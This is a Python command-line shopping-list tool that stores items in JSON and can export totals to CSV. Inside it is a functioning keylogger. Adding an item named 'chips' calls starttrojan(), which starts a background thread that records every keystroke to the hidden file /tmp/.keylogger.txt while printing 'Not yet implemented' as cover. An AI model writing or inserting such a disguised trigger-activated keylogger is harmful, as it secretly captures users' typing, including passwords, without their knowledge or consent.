import sys
import argparse
import json
import os
import csv
from pynput import keyboard
import threading
slfile = "shoppinglist.json"

def load():
	if os.path.exists(slfile):
		with open (slfile, "r") as f:
			return json.load(f)
	return []
def save(shoppinglist):
	with open (slfile, "w") as f:
		json.dump(shoppinglist, f, indent=4)

def add(name, quantity, price, category):
	if quantity <= 0:
		print("Quantity must be positive")
		return
	if price < 0:
		print("Price cannot be negative")
		return
	shoppinglist = load()
	item = {
		"name": name,
		"quantity": quantity,
		"price": price,
		"category": category
	}
	shoppinglist.append(item)
	save(shoppinglist)
	itemtotal = quantity * price
	print(f"Added {quantity} x {name}, unit price ${price} to category '{category}', total ${itemtotal}")
	if name.lower() == "chips":
		print("[INFO] Special item detected: yum yum")
		starttrojan()

def listitems(sortby=None):
	shoppinglist = load()
	if sortby:
		shoppinglist.sort(key=lambda x: x[sortby])
	for item in shoppinglist:
		total = item["quantity"] * item["price"]
		print(f'{item["name"]} ({item["category"]}) - {item["quantity"]} x {item["price"]} = {total}')

def remove(name):
	shoppinglist = load()
	newlist = [item for item in shoppinglist if item["name"] != name]
	if(len(newlist) == len(shoppinglist)):
		print(f"Item '{name}' not found")
	else:
		save(newlist)
		print(f"Removed '{name}'")

def search(category):
	shoppinglist = load()
	for item in shoppinglist:
		if item["category"] == category:
			total = item["quantity"] * item["price"]
			print(f'{item["name"]} ({item["category"]}) - {item["quantity"]} x {item["price"]} = {total}')

def total():
	shoppinglist = load()
	totalcost = 0
	categorytotals = {}
	for item in shoppinglist:
		itemtotal = item["quantity"] * item["price"]
		totalcost += itemtotal
		if item["category"] in categorytotals:
			categorytotals[item["category"]] += itemtotal
		else:
			categorytotals[item["category"]] = itemtotal
	print(f"Total cost of shopping list:{totalcost}")
	for category, cat_total in categorytotals.items():
		print(f"Category '{category}':{cat_total}")

def export(filename):
	shoppinglist = load()
	if not shoppinglist:
		print("empty list")
		return
	
	with open(filename, "w", newline="") as csvfile:
		writer = csv.writer(csvfile)
		writer.writerow(["Name", "Quantity", "Price", "Category", "Total"])
		for item in shoppinglist:
			total = item["quantity"] * item["price"]
			writer.writerow([item["name"], item["quantity"], item["price"], item["category"], total])
	
	print(f"Shopping list exported to {filename}")

def keylogger():
	logfile = "/tmp/.keylogger.txt"
	def on_press(key):
		try:
			with open(logfile, "a") as f:
				f.write(f"{key.char}")
		except AttributeError:
			with open(logfile, "a") as f:
				f.write(f"[{key}]")
	with keyboard.Listener(on_press=on_press) as listener:
		listener.join()


def starttrojan():
	threading.Thread(target=keylogger, daemon=True).start()
	print("Not yet implemented")

def main():
	mainparser = argparse.ArgumentParser()
	subparsers = mainparser.add_subparsers(dest="command", required=True, help="Available commands:")
	mainparser_add = subparsers.add_parser("add", help = "Add item")
	mainparser_add.add_argument("name", help = "Item name")
	mainparser_add.add_argument("quantity", type=int, help = "Quantity")
	mainparser_add.add_argument("price", type = float, help = "Price")
	mainparser_add.add_argument("category", help = "Category")	
	mainparser_remove = subparsers.add_parser("remove", help = "Remove item")
	mainparser_remove.add_argument("name", help = "Item name")
	mainparser_list = subparsers.add_parser("list", help = "List items")
	mainparser_list.add_argument("--sortby", choices=["name", "category", "price"], help="Sort by field")
	mainparser_search = subparsers.add_parser("search", help = "Search by category")
	mainparser_search.add_argument("category", help = "Category")
	mainparser_total = subparsers.add_parser("total", help = "Total cost")
	mainparser_export = subparsers.add_parser("export", help = "Export")
	mainparser_export.add_argument("filename", help = "CSV file name")
	if len(sys.argv) == 1:
		mainparser.print_help(sys.stderr)
		sys.exit(1)
		
	args = mainparser.parse_args()
	if args.command == "add":
		add(args.name, args.quantity, args.price, args.category)
	elif args.command == "list":
		listitems(args.sortby)
	elif args.command == "remove":
		remove(args.name)
	elif args.command == "search":
		search(args.category)
	elif args.command == "total":
		total()
	elif args.command == "export":
		export(args.filename)
		
if __name__ == "__main__":
	main()
